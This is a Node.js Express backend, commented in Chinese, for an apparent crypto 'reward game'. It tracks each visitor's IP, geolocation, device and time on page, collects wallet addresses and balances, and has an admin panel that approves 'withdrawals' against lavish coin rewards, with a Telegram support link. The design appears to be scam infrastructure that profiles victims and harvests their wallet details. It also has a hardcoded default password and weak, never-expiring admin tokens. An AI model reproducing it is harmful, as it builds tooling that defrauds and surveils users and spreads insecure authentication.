const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const UAParser = require('ua-parser-js');
const geoip = require('geoip-lite');

const app = express();
const PORT = process.env.PORT || 3000;

app.set('trust proxy', true);
app.use(cors());
app.use(express.json({ limit: '1mb' }));
app.use(express.static(path.join(__dirname, 'public')));

const DATA_DIR = path.join(__dirname, 'data');
const RECORDS_FILE = path.join(DATA_DIR, 'records.json');
const CONFIG_FILE = path.join(DATA_DIR, 'config.json');

if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

// 默认奖励配置（每个币种独立一套）
const DEFAULT_REWARDS = {
    USDT: { 2: 10,      3: 30,      4: 200,      5: 10000 },
    BTC:  { 2: 0.0001,  3: 0.0003,  4: 0.002,    5: 0.1 },
    ETH:  { 2: 0.001,   3: 0.003,   4: 0.02,     5: 1 },
    DOGE: { 2: 100,     3: 300,     4: 2000,     5: 100000 },
    TRX:  { 2: 100,     3: 300,     4: 2000,     5: 100000 },
    SOL:  { 2: 0.05,    3: 0.15,    4: 1,        5: 50 }
};

const VALID_CURRENCIES = ['USDT', 'BTC', 'ETH', 'DOGE', 'TRX', 'SOL'];

const DEFAULT_CONFIG = {
    adminPassword: process.env.ADMIN_PASSWORD || 'admin123456',
    dailyLimit: 1,
    telegramLink: 'https://t.me/your_default_support',
    heartbeatInterval: 30,
    currency: 'USDT',
    rewards: JSON.parse(JSON.stringify(DEFAULT_REWARDS))
};

const readJson = (filePath, defaultVal = {}) => {
    try { if (fs.existsSync(filePath)) return JSON.parse(fs.readFileSync(filePath, 'utf8')); }
    catch (e) { console.error('读取失败:', filePath, e); }
    return defaultVal;
};
const writeJson = (filePath, data) => {
    try { fs.writeFileSync(filePath, JSON.stringify(data, null, 2), 'utf8'); }
    catch (e) { console.error('写入失败:', filePath, e); }
};

let config = readJson(CONFIG_FILE, DEFAULT_CONFIG);
let configChanged = false;

// 补全顶层字段
for (const key in DEFAULT_CONFIG) {
    if (config[key] === undefined) { config[key] = DEFAULT_CONFIG[key]; configChanged = true; }
}
// 补全 rewards 每个币种
if (!config.rewards || typeof config.rewards !== 'object') {
    config.rewards = JSON.parse(JSON.stringify(DEFAULT_REWARDS));
    configChanged = true;
} else {
    for (const cur of VALID_CURRENCIES) {
        if (!config.rewards[cur] || typeof config.rewards[cur] !== 'object') {
            config.rewards[cur] = JSON.parse(JSON.stringify(DEFAULT_REWARDS[cur]));
            configChanged = true;
        } else {
            for (const k of ['2','3','4','5']) {
                if (config.rewards[cur][k] === undefined) {
                    config.rewards[cur][k] = DEFAULT_REWARDS[cur][k];
                    configChanged = true;
                }
            }
        }
    }
}
// 校验 currency
if (!VALID_CURRENCIES.includes(config.currency)) {
    config.currency = 'USDT';
    configChanged = true;
}
if (configChanged) writeJson(CONFIG_FILE, config);

let records = readJson(RECORDS_FILE, []);
if (!Array.isArray(records)) records = [];

const adminTokens = new Map();

const authenticateToken = (req, res, next) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];
    if (!token || !adminTokens.has(token)) return res.status(401).json({ error: '未授权或 Token 已过期' });
    next();
};

// ==================== 工具函数 ====================
function formatBeijingTime(iso) {
    try {
        const d = new Date(iso);
        if (isNaN(d.getTime())) return '';
        const bj = new Date(d.getTime() + 8 * 3600 * 1000);
        return bj.toISOString().replace('T', ' ').slice(0, 19);
    } catch { return ''; }
}

function guessDevice(ua) {
    const s = (ua || '').toLowerCase();
    if (/iphone|ipad|ipod/.test(s)) return 'ios';
    if (/android/.test(s)) return 'android';
    if (/windows|mac os|macintosh|linux|x11|cros/.test(s)) return 'desktop';
    return 'unknown';
}

function guessCountryByLang(lang) {
    const map = {
        zh:'CN', en:'US', es:'ES', hi:'IN', ar:'SA', pt:'BR', ru:'RU', ja:'JP',
        de:'DE', fr:'FR', ko:'KR', it:'IT', tr:'TR', vi:'VN', th:'TH', id:'ID',
        ms:'MY', nl:'NL', pl:'PL'
    };
    const l = (lang || '').toLowerCase().split('-')[0];
    return map[l] || '';
}

function detectCountry(ip, language) {
    if (ip) {
        let cleanIp = String(ip).split(',')[0].trim().replace(/^::ffff:/, '');
        if (cleanIp && cleanIp !== '::1' && !cleanIp.startsWith('127.') && !cleanIp.startsWith('10.') && !cleanIp.startsWith('192.168.')) {
            try {
                const geo = geoip.lookup(cleanIp);
                if (geo && geo.country) return geo.country;
            } catch (e) { console.warn('geoip 失败:', e.message); }
        }
    }
    return guessCountryByLang(language);
}

function extractContext(req) {
    const ip = req.ip || req.connection.remoteAddress || '';
    const ua = req.headers['user-agent'] || '';
    const parser = new UAParser(ua);
    const browser = parser.getBrowser();
    const os = parser.getOS();
    return {
        ip: ip,
        ua: ua,
        device: guessDevice(ua),
        os: `${os.name || ''} ${os.version || ''}`.trim() || '未知系统',
        browser: `${browser.name || ''} ${browser.version || ''}`.trim() || '未知浏览器'
    };
}

function calcDuration(visitIso, endIso) {
    if (!visitIso || !endIso) return 0;
    const t1 = new Date(visitIso).getTime();
    const t2 = new Date(endIso).getTime();
    if (isNaN(t1) || isNaN(t2) || t2 < t1) return 0;
    return Math.round((t2 - t1) / 1000);
}

function countTodaySubmitted(ip) {
    const now = Date.now();
    const bjNow = now + 8 * 3600 * 1000;
    const bjMidnight = new Date(bjNow);
    bjMidnight.setUTCHours(0, 0, 0, 0);
    const utcMidnight = bjMidnight.getTime() - 8 * 3600 * 1000;
    return records.filter(r => {
        if (r.ip !== ip) return false;
        if (!r.submit_time) return false;
        const t = new Date(r.submit_time).getTime();
        if (isNaN(t) || t < utcMidnight) return false;
        const st = r.auditStatus;
        return st === 'pending' || st === 'approved';
    }).length;
}

// ==================== 公共 API ====================

app.get('/api/public-settings', (req, res) => {
    const cur = config.currency || 'USDT';
    res.json({
        telegramLink: config.telegramLink || '',
        heartbeatInterval: Number(config.heartbeatInterval) || 30,
        currency: cur,
        rewards: config.rewards[cur] || DEFAULT_REWARDS[cur]
    });
});

app.get('/api/player-status', (req, res) => {
    const ip = req.ip || req.connection.remoteAddress || '';
    const used = countTodaySubmitted(ip);
    const limit = Number(config.dailyLimit) || 1;
    const canPlay = used < limit;
    res.json({
        canPlay: canPlay,
        used: used,
        limit: limit,
        hasSubmitted: used > 0,
        status: canPlay ? 'can_play' : 'limit_reached'
    });
});

app.post('/api/visit-start', (req, res) => {
    try {
        const ctx = extractContext(req);
        const nowIso = new Date().toISOString();
        const body = req.body || {};
        const language = body.language || '';
        const country = detectCountry(ctx.ip, language);
        const visitId = body.visitId || (Date.now() + '_' + Math.random().toString(36).slice(2, 8));

        const record = {
            id: visitId,
            visitId: visitId,
            ip: ctx.ip,
            userAgent: ctx.ua,
            device: ctx.device,
            os: ctx.os,
            browser: ctx.browser,
            country: country,
            language: language,

            visit_time: nowIso,
            visit_time_local: formatBeijingTime(nowIso),
            submit_time: null,
            submit_time_local: null,
            leave_time: null,
            leave_time_local: null,
            last_heartbeat: nowIso,

            duration: 0,

            address: '',
            balance: '0',
            amount: '0',
            currency: config.currency || 'USDT',

            status: 'visiting',
            auditStatus: null,

            createdAt: nowIso
        };

        records.push(record);
        writeJson(RECORDS_FILE, records);

        res.json({ success: true, id: visitId });
    } catch (e) {
        console.error('visit-start 失败:', e);
        res.status(500).json({ error: '保存失败' });
    }
});

app.post('/api/visit-heartbeat', (req, res) => {
    try {
        const { id } = req.body || {};
        if (!id) return res.status(400).json({ error: '缺少 id' });
        const rec = records.find(r => r.id === id);
        if (!rec) return res.status(404).json({ error: '记录不存在' });
        if (rec.leave_time) return res.json({ success: true, ended: true });
        const nowIso = new Date().toISOString();
        rec.last_heartbeat = nowIso;
        rec.duration = calcDuration(rec.visit_time, nowIso);
        writeJson(RECORDS_FILE, records);
        res.json({ success: true });
    } catch (e) {
        res.status(500).json({ error: '失败' });
    }
});

app.post('/api/visit-end', (req, res) => {
    try {
        const { id } = req.body || {};
        if (!id) return res.status(400).json({ error: '缺少 id' });
        const rec = records.find(r => r.id === id);
        if (!rec) return res.status(404).json({ error: '记录不存在' });
        if (rec.leave_time) return res.json({ success: true });
        const nowIso = new Date().toISOString();
        rec.leave_time = nowIso;
        rec.leave_time_local = formatBeijingTime(nowIso);
        rec.duration = calcDuration(rec.visit_time, nowIso);
        if (rec.status === 'visiting') rec.status = 'left';
        writeJson(RECORDS_FILE, records);
        res.json({ success: true });
    } catch (e) {
        res.status(500).json({ error: '失败' });
    }
});

app.post('/api/records', (req, res) => {
    try {
        const ctx = extractContext(req);
        const body = req.body || {};
        const { id } = body;

        const used = countTodaySubmitted(ctx.ip);
        const limit = Number(config.dailyLimit) || 1;
        if (used >= limit) {
            return res.status(429).json({ error: 'DAILY_LIMIT_REACHED', used: used, limit: limit });
        }

        if (!id) return res.status(400).json({ error: '缺少访问记录 id' });
        const rec = records.find(r => r.id === id);
        if (!rec) return res.status(404).json({ error: '访问记录不存在' });
        if (rec.auditStatus === 'pending' || rec.auditStatus === 'approved' || rec.auditStatus === 'rejected') {
            return res.status(409).json({ error: 'ALREADY_SUBMITTED' });
        }

        const nowIso = new Date().toISOString();
        const language = body.language || rec.language || '';
        rec.address = body.address || '';
        rec.balance = body.balance || '0';
        rec.amount = body.balance || '0';
        rec.currency = body.currency || config.currency || 'USDT';
        rec.language = language;
        rec.country = detectCountry(ctx.ip, language) || rec.country;
        rec.submit_time = nowIso;
        rec.submit_time_local = formatBeijingTime(nowIso);
        rec.status = 'pending';
        rec.auditStatus = 'pending';
        if (!rec.leave_time) {
            rec.last_heartbeat = nowIso;
            rec.duration = calcDuration(rec.visit_time, nowIso);
        }

        writeJson(RECORDS_FILE, records);
        res.json({ success: true, record: rec });
    } catch (e) {
        console.error('提交失败:', e);
        res.status(500).json({ error: '保存失败' });
    }
});

app.get('/api/records', authenticateToken, (req, res) => {
    res.json({ records: records.slice().reverse() });
});

app.get('/api/my-withdrawals', (req, res) => {
    const ip = req.ip || req.connection.remoteAddress || '';
    const mine = records
        .filter(r => r.ip === ip && r.submit_time)
        .slice(-10)
        .reverse();
    res.json(mine);
});

// ==================== 管理员 API ====================

app.post('/api/login', (req, res) => {
    const { password } = req.body || {};
    if (password === config.adminPassword) {
        const token = Math.random().toString(36).slice(2) + Date.now().toString(36);
        adminTokens.set(token, Date.now() + 24 * 60 * 60 * 1000);
        return res.json({ token });
    }
    res.status(401).json({ error: '密码错误' });
});

app.post('/api/audit', authenticateToken, (req, res) => {
    const { id, status, action } = req.body || {};
    const finalStatus = status || (action === 'approve' ? 'approved' : action === 'reject' ? 'rejected' : null);
    if (!finalStatus) return res.status(400).json({ error: '无效状态' });

    const rec = records.find(r => String(r.id) === String(id));
    if (!rec) return res.status(404).json({ error: '记录不存在' });
    if (rec.auditStatus === 'approved' || rec.auditStatus === 'rejected') {
        return res.status(409).json({ error: '该记录已审核' });
    }
    rec.auditStatus = finalStatus;
    rec.status = finalStatus;
    rec.auditedAt = new Date().toISOString();
    writeJson(RECORDS_FILE, records);
    res.json({ success: true });
});

app.post('/api/audit-batch', authenticateToken, (req, res) => {
    const { ids, status, action } = req.body || {};
    const finalStatus = status || (action === 'approve' ? 'approved' : action === 'reject' ? 'rejected' : null);
    if (!finalStatus || !Array.isArray(ids)) return res.status(400).json({ error: '参数错误' });

    let updated = 0, skipped = 0;
    ids.forEach(id => {
        const rec = records.find(r => String(r.id) === String(id));
        if (!rec) { skipped++; return; }
        if (rec.auditStatus === 'approved' || rec.auditStatus === 'rejected') { skipped++; return; }
        if (!rec.submit_time) { skipped++; return; }
        rec.auditStatus = finalStatus;
        rec.status = finalStatus;
        rec.auditedAt = new Date().toISOString();
        updated++;
    });
    writeJson(RECORDS_FILE, records);
    res.json({ success: true, updated: updated, skipped: skipped });
});

app.get('/api/config', authenticateToken, (req, res) => {
    res.json({
        dailyLimit: config.dailyLimit,
        telegramLink: config.telegramLink || '',
        heartbeatInterval: Number(config.heartbeatInterval) || 30,
        currency: config.currency || 'USDT',
        rewards: config.rewards || DEFAULT_REWARDS
    });
});

app.post('/api/config', authenticateToken, (req, res) => {
    const body = req.body || {};
    if (body.dailyLimit !== undefined) {
        const v = parseInt(body.dailyLimit, 10);
        if (isNaN(v) || v < 1 || v > 100) return res.status(400).json({ error: '提现次数必须在 1-100' });
        config.dailyLimit = v;
    }
    if (body.heartbeatInterval !== undefined) {
        const h = parseInt(body.heartbeatInterval, 10);
        if (isNaN(h) || h < 5 || h > 300) return res.status(400).json({ error: '心跳间隔必须在 5-300 秒' });
        config.heartbeatInterval = h;
    }
    if (body.currency !== undefined) {
        if (!VALID_CURRENCIES.includes(body.currency)) return res.status(400).json({ error: '无效的币种' });
        config.currency = body.currency;
    }
    // 接收当前币种的 rewards
    if (body.currencyRewards !== undefined && typeof body.currencyRewards === 'object') {
        const cur = config.currency;
        const cr = body.currencyRewards;
        const newR = { ...config.rewards[cur] };
        for (const k of ['2','3','4','5']) {
            if (cr[k] !== undefined) {
                const num = parseFloat(cr[k]);
                if (isNaN(num) || num < 0) return res.status(400).json({ error: '奖励金额必须为 >= 0 的数字' });
                newR[k] = num;
            }
        }
        config.rewards[cur] = newR;
    }
    writeJson(CONFIG_FILE, config);
    res.json({ success: true });
});

app.post('/api/admin/settings', authenticateToken, (req, res) => {
    const { telegramLink } = req.body || {};
    if (typeof telegramLink !== 'string') return res.status(400).json({ error: '无效链接' });
    config.telegramLink = telegramLink;
    writeJson(CONFIG_FILE, config);
    res.json({ success: true });
});

app.post('/api/change-password', authenticateToken, (req, res) => {
    const { oldPassword, newPassword } = req.body || {};
    if (oldPassword !== undefined && oldPassword !== config.adminPassword) {
        return res.status(401).json({ error: '当前密码错误' });
    }
    if (!newPassword || newPassword.length < 6) {
        return res.status(400).json({ error: '新密码至少 6 位' });
    }
    config.adminPassword = newPassword;
    writeJson(CONFIG_FILE, config);
    res.json({ success: true });
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
